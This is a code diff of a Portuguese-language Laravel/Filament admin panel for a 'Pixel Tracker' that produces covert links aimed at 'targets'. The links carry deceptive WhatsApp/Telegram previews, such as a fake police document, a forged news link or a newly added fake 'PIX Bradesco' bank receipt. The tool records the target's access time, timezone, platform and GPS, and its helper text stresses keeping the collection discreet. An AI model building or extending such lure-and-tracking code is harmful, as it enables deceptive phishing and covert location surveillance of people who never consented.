@@ -15,10 +15,18 @@ use Filament\Schemas\Components\Utilities\Get;
 use Filament\Tables;
 use Filament\Tables\Table;
 use Illuminate\Database\Eloquent\Builder;
+use Illuminate\Database\Eloquent\Model;
 
+/**
+ * Resource do usuário — exibe e gerencia apenas os próprios pixels.
+ */
 class PixelTrackResource extends Resource
 {
     protected static ?string $model = PixelTrack::class;
+
+    protected static ?string $slug = 'pixel-tracks';
+
+    // ─── Navegação ─────────────────────────────────────────────────────────────
 
     public static function getNavigationIcon(): string|\BackedEnum|null
     {
@@ -35,6 +43,29 @@ class PixelTrackResource extends Resource
         return 'Pixel Tracker';
     }
 
+    public static function getNavigationSort(): ?int
+    {
+        return 60;
+    }
+
+    /** Badge mostra quantos pixels próprios ainda estão aguardando captura. */
+    public static function getNavigationBadge(): ?string
+    {
+        $count = PixelTrack::query()
+            ->where('created_by', auth()->id())
+            ->whereNull('clicked_at')
+            ->count();
+
+        return $count > 0 ? (string) $count : null;
+    }
+
+    public static function getNavigationBadgeColor(): ?string
+    {
+        return 'warning';
+    }
+
+    // ─── Labels ────────────────────────────────────────────────────────────────
+
     public static function getModelLabel(): string
     {
         return 'Pixel de Rastreamento';
@@ -45,19 +76,34 @@ class PixelTrackResource extends Resource
         return 'Pixels de Rastreamento';
     }
 
-    public static function getNavigationSort(): ?int
-    {
-        return 60;
-    }
+    // ─── Páginas ───────────────────────────────────────────────────────────────
 
     public static function getPages(): array
     {
         return [
             'index'  => ListPixelTracks::route('/'),
             'create' => CreatePixelTrack::route('/create'),
-            'view' => ViewPixelTrack::route('/{record}'),
+            'view'   => ViewPixelTrack::route('/{record}'),
         ];
     }
+
+    // ─── Controle de acesso ────────────────────────────────────────────────────
+
+    /** Cada usuário vê e gerencia apenas os pixels que ele mesmo criou. */
+    public static function getEloquentQuery(): Builder
+    {
+        return parent::getEloquentQuery()
+            ->with('criador')
+            ->where('created_by', auth()->id())
+            ->latest();
+    }
+
+    public static function canEdit(Model $record): bool
+    {
+        return false;
+    }
+
+    // ─── Formulário de criação ─────────────────────────────────────────────────
 
     public static function form(Schema $schema): Schema
     {
@@ -75,8 +121,9 @@ class PixelTrackResource extends Resource
                     Forms\Components\Select::make('preview_tipo')
                         ->label('Tipo de link')
                         ->options([
-                            'mensagem' => 'Mensagem do sistema',
-                            'noticia' => 'Notícia externa',
+                            'mensagem'      => 'Mensagem do sistema',
+                            'noticia'       => 'Notícia externa',
+                            'pix_bradesco'  => 'PIX Bradesco (comprovante)',
                         ])
                         ->default('mensagem')
                         ->selectablePlaceholder(false)
@@ -93,7 +140,7 @@ class PixelTrackResource extends Resource
                         ->default('Este documento não está mais disponível.')
                         ->selectablePlaceholder(false)
                         ->required()
-                        ->visible(fn (Get $get): bool => $get('preview_tipo') !== 'noticia')
+                        ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'pix_bradesco'], true))
                         ->columnSpanFull(),
 
                     Forms\Components\TextInput::make('noticia_url')
@@ -103,35 +150,36 @@ class PixelTrackResource extends Resource
                         ->maxLength(255)
                         ->required(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
                         ->visible(fn (Get $get): bool => $get('preview_tipo') === 'noticia')
-                        ->helperText('O sistema tentará usar título, descrição e imagem da notícia no preview. Ao clicar no link gerado, o alvo será encaminhado para esta URL.')
+                        ->helperText('O sistema usará título, descrição e imagem da notícia no preview. Ao clicar, o alvo será encaminhado para esta URL.')
                         ->columnSpanFull(),
 
                     Forms\Components\Toggle::make('capture_gps')
                         ->label('Solicitar GPS do alvo')
                         ->default(false)
-                        ->helperText('A captura de GPS depende de autorização explícita do alvo no navegador. A solicitação de permissão pode comprometer a discrição da coleta.')
+                        ->helperText('Depende de autorização explícita do alvo no navegador. Pode comprometer a discrição da coleta.')
                         ->columnSpanFull(),
                 ]),
 
             \Filament\Schemas\Components\Section::make('Preview no WhatsApp / Telegram')
-                ->description('O que aparece automaticamente quando o link é colado antes de ser clicado.')
+                ->description('O que aparece quando o link é colado antes de ser clicado.')
                 ->collapsed()
+                ->visible(fn (Get $get): bool => ! in_array($get('preview_tipo'), ['noticia', 'pix_bradesco'], true))
                 ->components([
                     Forms\Components\TextInput::make('og_titulo')
                         ->label('Título do preview')
                         ->placeholder('Ex: Documento Policial — Delegacia de Confresa')
-                        ->maxLength(100)
+                        ->maxLength(255)
                         ->columnSpanFull(),
 
                     Forms\Components\TextInput::make('og_descricao')
                         ->label('Descrição do preview')
                         ->placeholder('Ex: Clique para visualizar o documento.')
-                        ->maxLength(200)
+                        ->maxLength(255)
                         ->columnSpanFull(),
 
                     Forms\Components\FileUpload::make('og_imagem_upload')
                         ->label('Upload de imagem do preview')
-                        ->helperText('Faça upload de uma imagem JPEG ou PNG. Se preenchido, tem prioridade sobre a URL abaixo.')
+                        ->helperText('JPEG ou PNG. Tem prioridade sobre a URL abaixo.')
                         ->image()
                         ->disk('public')
                         ->directory('pixel-og')
@@ -151,10 +199,11 @@ class PixelTrackResource extends Resource
         ]);
     }
 
+    // ─── Tabela do usuário ─────────────────────────────────────────────────────
+
     public static function table(Table $table): Table
     {
         return $table
-            ->modifyQueryUsing(fn (Builder $query) => $query->with('criador')->latest())
             ->recordUrl(null)
             ->columns([
                 Tables\Columns\TextColumn::make('label')
@@ -175,8 +224,8 @@ class PixelTrackResource extends Resource
                 Tables\Columns\TextColumn::make('status')
                     ->label('Status')
                     ->badge()
-                    ->state(fn (PixelTrack $record) => $record->clicked_at ? 'Capturado' : 'Aguardando')
-                    ->color(fn (PixelTrack $record) => $record->clicked_at ? 'success' : 'warning'),
+                    ->state(fn (PixelTrack $r) => $r->clicked_at ? 'Capturado' : 'Aguardando')
+                    ->color(fn (PixelTrack $r) => $r->clicked_at ? 'success' : 'warning'),
 
                 Tables\Columns\TextColumn::make('total_acessos')
                     ->label('Acessos')
@@ -194,16 +243,12 @@ class PixelTrackResource extends Resource
                     ->alignCenter()
                     ->placeholder('—'),
 
-                // Tables\Columns\TextColumn::make('ip_local')
-                //     ->label('IP Local (WebRTC)')
-                //     ->copyable()
-                //     ->placeholder('—')
-                //     ->tooltip('IP privado quando o navegador permitir; em navegadores modernos pode aparecer como hostname mDNS .local.'),
-
                 Tables\Columns\TextColumn::make('gmt')
-                    ->label('GMT / Fuso')
-                    ->placeholder('—')
-                    ->wrap(),
+                    ->label('GMT')
+                    ->formatStateUsing(fn (?string $state): string => $state
+                        ? trim(explode(' ', $state)[0])
+                        : '—')
+                    ->placeholder('—'),
 
                 Tables\Columns\TextColumn::make('plataforma')
                     ->label('Plataforma')
@@ -220,46 +265,12 @@ class PixelTrackResource extends Resource
                     ->placeholder('—')
                     ->toggleable(isToggledHiddenByDefault: true),
 
-                // Tables\Columns\TextColumn::make('localizacao')
-                //     ->label('Localização IP')
-                //     ->placeholder('—')
-                //     ->state(fn (PixelTrack $r) => implode(', ', array_filter([
-                //         $r->cidade,
-                //         $r->regiao,
-                //         $r->pais,
-                //     ])) ?: null),
-
-                // Tables\Columns\TextColumn::make('coordenadas')
-                //     ->label('Coordenadas IP')
-                //     ->placeholder('—')
-                //     ->state(fn (PixelTrack $r) => $r->latitude !== null
-                //         ? "{$r->latitude}, {$r->longitude}"
-                //         : null
-                //     ),
-
-                // Tables\Columns\TextColumn::make('isp')
-                //     ->label('ISP / Operadora')
-                //     ->placeholder('—')
-                //     ->toggleable(isToggledHiddenByDefault: true),
-
-                // Tables\Columns\TextColumn::make('user_agent')
-                //     ->label('User-Agent')
-                //     ->limit(60)
-                //     ->tooltip(fn (PixelTrack $r) => $r->user_agent)
-                //     ->placeholder('—')
-                //     ->toggleable(isToggledHiddenByDefault: true),
-
                 Tables\Columns\TextColumn::make('clicked_at')
                     ->label('Hora do Acesso')
                     ->dateTime('d/m/Y H:i:s')
                     ->timezone('America/Sao_Paulo')
                     ->placeholder('—')
                     ->sortable(),
-
-                Tables\Columns\TextColumn::make('criador.name')
-                    ->label('Criado por')
-                    ->sortable()
-                    ->toggleable(isToggledHiddenByDefault: true),
 
                 Tables\Columns\TextColumn::make('created_at')
                     ->label('Criado em')
@@ -304,25 +315,40 @@ class PixelTrackResource extends Resource
                     ->label('Histórico')
                     ->icon('heroicon-o-clock'),
 
-                Actions\Action::make('copiar_img_tag')
-                    ->label('Tag <img>')
-                    ->icon('heroicon-o-code-bracket')
+                Actions\Action::make('copiar_url')
+                    ->label('Copiar URL')
+                    ->icon('heroicon-o-clipboard-document')
                     ->color('gray')
                     ->action(function (PixelTrack $record): void {
-                        $url    = route('pixel.gif', $record->token);
-                        $imgTag = "<img src=\"{$url}\" width=\"1\" height=\"1\" alt=\"\" style=\"display:none\">";
+                        $url = route('pixel.track', $record->token);
 
                         Notification::make()
-                            ->title('Tag HTML do Pixel (e-mail)')
-                            ->body($imgTag)
-                            ->info()
+                            ->title('URL do pixel copiada')
+                            ->body($url)
+                            ->success()
                             ->persistent()
                             ->send();
                     }),
 
+                // Actions\Action::make('copiar_img_tag')
+                //     ->label('Tag <img>')
+                //     ->icon('heroicon-o-code-bracket')
+                //     ->color('gray')
+                //     ->action(function (PixelTrack $record): void {
+                //         $url    = route('pixel.gif', $record->token);
+                //         $imgTag = "<img src=\"{$url}\" width=\"1\" height=\"1\" alt=\"\" style=\"display:none\">";
+
+                //         Notification::make()
+                //             ->title('Tag HTML do Pixel (e-mail)')
+                //             ->body($imgTag)
+                //             ->info()
+                //             ->persistent()
+                //             ->send();
+                //     }),
+
                 Actions\Action::make('ver_mapa_gps')
-                    ->label('Mapa GPS')
-                    ->icon('heroicon-o-map')
+                    ->label('GPS')
+                    ->icon('heroicon-o-map-pin')
                     ->color('info')
                     ->visible(fn (PixelTrack $r) => $r->gps_latitude !== null)
                     ->url(fn (PixelTrack $r) => "https://www.google.com/maps?q={$r->gps_latitude},{$r->gps_longitude}")
@@ -334,10 +360,5 @@ class PixelTrackResource extends Resource
             ->emptyStateHeading('Nenhum pixel criado')
             ->emptyStateDescription('Crie um pixel de rastreamento para gerar um link invisível.')
             ->emptyStateIcon('heroicon-o-eye-slash');
-    }
-
-    public static function canEdit(\Illuminate\Database\Eloquent\Model $record): bool
-    {
-        return false;
     }
 }
